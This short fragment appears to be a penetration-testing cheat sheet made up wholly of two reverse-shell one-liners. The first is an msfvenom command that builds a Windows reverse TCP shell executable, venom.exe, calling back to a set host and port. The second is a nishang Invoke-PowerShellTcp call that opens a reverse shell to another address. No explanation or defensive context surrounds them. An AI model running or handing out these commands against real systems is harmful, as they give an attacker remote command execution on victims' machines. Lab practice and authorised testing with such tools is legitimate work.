msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=10.12.15.117 LPORT=6697 -f exe -o venom.exe


### nishang
{Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444}